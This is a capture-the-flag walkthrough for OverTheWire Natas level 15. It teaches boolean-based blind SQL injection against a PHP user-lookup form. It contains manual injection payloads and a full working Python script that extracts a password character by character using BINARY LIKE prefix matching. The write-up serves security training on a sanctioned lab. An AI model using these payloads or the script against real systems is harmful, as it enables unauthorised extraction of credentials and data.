# OverTheWire: Natas — Level 15 → Level 16

> **Vulnerability Type:** Blind SQL Injection — Boolean-Based Character Extraction                                                 
> **Skills:** PHP source code review, SQL query analysis, blind SQLi inference, Python scripting                                     
> **Difficulty:** Medium–Hard                                                                    
> **Official Page:** [Natas Level 15](https://overthewire.org/wargames/natas/natas15.html)

---

## Access

- **URL:** `http://natas15.natas.labs.overthewire.org`
- **Username:** `natas15`
- **Password:** *obtain from previous level*

---

## Task

Extract the password for `natas16` from the database one character at a time, using boolean-based blind SQL injection against a username-only login form that returns no data — only a binary yes/no response.

---

## Vulnerability

This level demonstrates **blind SQL injection**, specifically the boolean-based variant. The developer again concatenates unsanitised user input directly into a SQL query, but unlike Level 14 there is no data returned in the response — the page only tells you whether a user exists or not. An attacker cannot read database values directly; instead, they craft SQL conditions that are either true or false and observe which response state the page returns. By asking enough true/false questions about the contents of the database, the full value of any column can be reconstructed character by character. The developer mistake is identical to Level 14 — no parameterised queries, no input sanitisation — but the consequence here requires a more sophisticated extraction technique.

---

## Theory

### Blind SQL Injection vs. Error-Based / Union-Based

In Level 14, the injected query returned rows that the application acted on visibly (login granted or denied, with the password printed on success). That is still a relatively information-rich channel.

Blind SQL injection is the term for when the application returns **no query data at all** — only a binary behavioural difference between a true condition and a false one. You cannot see column values. You cannot see error messages. You can only observe: did the page say yes, or did it say no?

| Injection Type | What the Server Returns | Extraction Method |
|---|---|---|
| Error-based | Database error messages | Read values from error text |
| Union-based | Extra rows appended to results | Read values from page output |
| Boolean-based blind | One of two page states | Infer values from true/false responses |
| Time-based blind | Response delay or not | Infer values from timing (no page difference at all) |

This level is boolean-based blind. There are exactly two observable states:
- `This user exists.` — the injected condition was **true**
- `This user doesn't exist.` — the injected condition was **false**

Everything in the extraction technique is built on that single bit of information per request.

### The Core Injection Pattern

The server's query template is:

```sql
SELECT * FROM users WHERE username="[INPUT]"
```

By injecting a closing quote followed by an `AND` condition, you can attach an arbitrary boolean test to the query:

```sql
-- Injected input: natas16" AND SUBSTRING(password,1,1) = "a" #
SELECT * FROM users WHERE username="natas16" AND SUBSTRING(password,1,1) = "a" #"
```

- `natas16"` — closes the username string and selects the real user row
- `AND SUBSTRING(password,1,1) = "a"` — adds a condition that is only true if the first character of the password is `a`
- `#` — MySQL line comment; discards the trailing `"` left over from the query template

If the first character is `a`, the overall `WHERE` clause is true, the row is returned, and the page says `This user exists.` If it is not `a`, the clause is false, no row is returned, and the page says `This user doesn't exist.`

Repeat this for every position and every possible character — and you reconstruct the entire password.

### Why `BINARY` is Required

By default, MySQL string comparisons are **case-insensitive**. This means:

```sql
SUBSTRING(password,1,1) = "a"   -- matches both 'a' AND 'A'
```

Without `BINARY`, you cannot distinguish lowercase from uppercase — half your character set collapses. The password for natas16 contains mixed case, so this matters.

The `BINARY` keyword forces a **byte-for-byte, case-sensitive** comparison:

```sql
BINARY SUBSTRING(password,1,1) = "a"   -- matches 'a' only, not 'A'
```

Always use `BINARY` (or its equivalent `COLLATE utf8_bin`) when extracting passwords character by character.

### Why `LIKE` with `%` Instead of `=`

The automation script uses `BINARY password LIKE "attempt%"` rather than `BINARY SUBSTRING(password,N,1) = "char"`. Both work; they represent two different approaches to the same problem.

| Approach | Payload Pattern | Mechanism |
|---|---|---|
| Substring equality | `SUBSTRING(password,N,1) = "X"` | Tests one character at position N |
| Prefix `LIKE` | `password LIKE "known_prefix X%"` | Tests whether password starts with the accumulated prefix plus one new character |

The `LIKE` prefix approach accumulates a growing known prefix and tests whether the full password starts with `prefix + candidate`. The `%` wildcard matches anything after. When the condition is true, the candidate character is appended to the prefix and the next character is tested by extending the prefix again.

Both approaches require the same number of requests per character. The `LIKE` approach is slightly more readable in scripts; the `SUBSTRING` approach maps more directly to the manual payload.

### Knowing the Password Length

OverTheWire Natas passwords are consistently 32 characters — the same length as an MD5 hash. You can also verify this programmatically with:

```sql
natas16" AND LENGTH(password) = 32 #
```

If the page returns `This user exists.`, the password is 32 characters. Adjust the number until you find a match if you are unsure.

### The `debug` GET Parameter

As in Level 14, the source code checks for a `debug` GET parameter. Appending `?debug=1` to the URL causes the server to print the exact SQL query it is executing. Always use this when crafting and verifying your payloads manually before automating.

### Tools Used

| Tool | Purpose |
|---|---|
| Browser (View Source) | Read the PHP source code |
| Browser (manual payload) | Confirm the two response states before scripting |
| `requests` (Python) | Send HTTP POST requests with injection payloads |
| `string` module (Python) | Generate the character set to iterate over |

---

## Solution

### Step 1: Read the PHP Source

Log in and click **View sourcecode**. The relevant PHP is:

```php
<?php

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";

    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
        if(mysql_num_rows($res) > 0) {
            echo "This user exists.<br>";
        } else {
            echo "This user doesn't exist.<br>";
        }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
```

> **What to notice:** The form only takes a username — there is no password field. The response is strictly one of two strings: `This user exists.` or `This user doesn't exist.`. No data from the database is ever printed to the page. This is the information constraint that defines blind injection. Also note that the `debug` parameter is available here too.

---

### Step 2: Confirm the Injection Point Manually

Before scripting anything, verify the injection works by testing a known-true condition in the browser.

In the username field, enter:

```
natas16" AND 1=1 #
```

> **What to notice:** The page should return `This user exists.` — because the user `natas16` exists in the database and `1=1` is always true.

Now enter:

```
natas16" AND 1=2 #
```

> **What to notice:** The page should return `This user doesn't exist.` — because `1=2` is always false. You now have confirmed that the two observable states are working and that your injected conditions are being evaluated. This is the foundation of everything that follows.

---

### Step 3: Confirm Case Sensitivity with `BINARY`

Test a character you know will not be the first character of the password to observe both states, then test with `BINARY` to confirm case sensitivity works:

```
natas16" AND BINARY SUBSTRING(password,1,1) = "a" #
```

Append `?debug=1` to the URL while testing to see the exact query the server executes:

```
http://natas15.natas.labs.overthewire.org/index.php?debug=1
```

The debug output will show:

```sql
Executing query: SELECT * from users where username="natas16" AND BINARY SUBSTRING(password,1,1) = "a" #"
```

> **What to notice:** The trailing `"` from the original query template is now commented out by `#`. The injected condition is isolated and evaluating correctly. If you do not see this, check your quoting — the most common error is a misplaced or missing `"` that breaks the query structure.

---

### Step 4: Confirm the Password Length

Before extracting characters, confirm the password is 32 characters:

```
natas16" AND LENGTH(password) = 32 #
```

> **What to notice:** If the page returns `This user exists.`, the password is exactly 32 characters and the script can be written with a fixed loop length. If it returns `This user doesn't exist.`, adjust the number and retry.

---

### Step 5: Run the Automated Extraction Script

Manual testing at 32 positions × 62 possible characters = up to 1,984 requests. Automate this with the following Python 3 script.

Save it as `natas15.py`, replacing the `password` variable with the actual `natas15` credential you obtained from the previous level:

```python
#!/usr/bin/env python3

import requests
import time
from string import ascii_lowercase, ascii_uppercase, digits

# Character set: a-z, A-Z, 0-9
characters = ascii_lowercase + ascii_uppercase + digits

username = 'natas15'
password = 'PASSWORD_FROM_LEVEL_14'   # replace with actual credential

url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()
found = []

print(f"[*] Starting blind SQLi extraction against {url}")
print(f"[*] Character set: {characters}\n")

while len(found) < 32:
    for ch in characters:
        # Build the candidate: everything found so far, plus the next character to test
        attempt = "".join(found) + ch

        # Payload: check if the natas16 password starts with the current candidate prefix
        # BINARY forces case-sensitive comparison
        # LIKE with % matches any suffix after the known prefix
        payload = f'natas16" AND BINARY password LIKE "{attempt}%" #'

        try:
            response = session.post(
                url,
                data={"username": payload},
                auth=(username, password),
                timeout=10
            )

            if 'This user exists' in response.text:
                found.append(ch)
                print(f"[+] Position {len(found):02d}: '{ch}'  |  Found so far: {''.join(found)}")
                break

        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed: {e} — retrying in 1 second")
            time.sleep(1)
            continue

        time.sleep(0.05)   # small delay to avoid hammering the server

print(f"\n[*] Extraction complete.")
print(f"[*] Password for natas16: {''.join(found)}")
```

Run it:

```bash
python3 natas15.py
```

Expected output (character values will differ):

```
[*] Starting blind SQLi extraction against http://natas15.natas.labs.overthewire.org/
[*] Character set: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789

[+] Position 01: 'T'  |  Found so far: T
[+] Position 02: 'T'  |  Found so far: TT
[+] Position 03: 'k'  |  Found so far: TTk
[+] Position 04: 'I'  |  Found so far: TTkI
...
[+] Position 32: 'x'  |  Found so far: TTkIo...x

[*] Extraction complete.
[*] Password for natas16: TTkIo...
```

> **What to notice:** Each printed line represents one confirmed character. The script is not guessing the full password at once — it is building it one character at a time using prefix matching. At each position, it iterates through all 62 characters in order and stops as soon as a `This user exists.` response is received, appending that character to the known prefix before moving to the next position.

---

### How the Script Logic Works

The key section is the payload line:

```python
payload = f'natas16" AND BINARY password LIKE "{attempt}%" #'
```

At position 3, if the first two characters found were `T` and `T`, `attempt` is `TTk` (the prefix so far, plus the current candidate `k`). The full injected SQL becomes:

```sql
SELECT * FROM users WHERE username="natas16" AND BINARY password LIKE "TTk%" #"
```

This asks: does the password for `natas16` start with `TTk`? If yes, `k` is confirmed as position 3 and becomes part of the prefix. If no, the loop continues to the next character.

> **What to notice:** The `BINARY` keyword before `password` applies case sensitivity to the entire `LIKE` comparison — not just to a substring. This ensures that once `T` is confirmed at position 1, testing `t` at position 1 would return false, so the correct case is preserved throughout extraction.

---

## Password for Next Level

```
[redacted — obtain by running the extraction script above]
```

---

## Key Takeaways

- Blind SQL injection recovers data from a database using only binary yes/no responses. The absence of visible output does not prevent data extraction — it only changes the technique required. Given enough requests and a distinguishable response state, any column value can be reconstructed one character at a time.
- Case sensitivity in string comparisons is a practical concern, not a theoretical one. Without `BINARY` in MySQL, uppercase and lowercase characters are indistinguishable, which means a 62-character set collapses to 36 and the extracted value may have incorrect casing. Always enforce case-sensitive comparison when extracting passwords or hashes.
- Blind SQLi automation follows a predictable structure: a fixed character set, a fixed length (or length detection), and a per-position loop that sends one request per candidate character. The worst-case request count is `length × charset_size` — for 32 characters and 62-character set, that is 1,984 requests. Prefix-based `LIKE` matching and early termination on hit reduce the average case significantly.

---

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| Omitting `BINARY` from the payload | MySQL treats `a` and `A` as equal; the script confirms the wrong case for mixed-case characters and produces an incorrect password | Always prefix the comparison with `BINARY`: `BINARY password LIKE "..."` |
| Using `=` instead of `LIKE "...%"` in the prefix approach | The equality check only matches the full 32-character password, not a growing prefix — the condition is never true until all 32 characters happen to be correct simultaneously | Use `LIKE "prefix%"` so the condition matches any password that starts with the accumulated prefix |
| Not testing the injection manually before scripting | The script runs hundreds of requests, fails silently, and produces an empty or wrong result with no indication of where the payload broke | Always confirm both response states manually in the browser and use `?debug=1` to verify the query structure before automating |
| Not adding a delay between requests | The server may rate-limit or drop connections under rapid fire, causing silent failures and gaps in the recovered password | Add `time.sleep(0.05)` between requests and implement retry logic for connection errors |
| Hardcoding the password length as 32 without verifying | If a level ever changes or the assumption is wrong, the loop exits early with an incomplete result | Confirm with `AND LENGTH(password) = 32 #` before running the full extraction |
| Searching only lowercase or only alphanumeric characters | The password contains characters outside the tested set; those positions never match and the loop stalls indefinitely | Use `ascii_lowercase + ascii_uppercase + digits` as a minimum; extend with special characters if the loop stalls at any position |
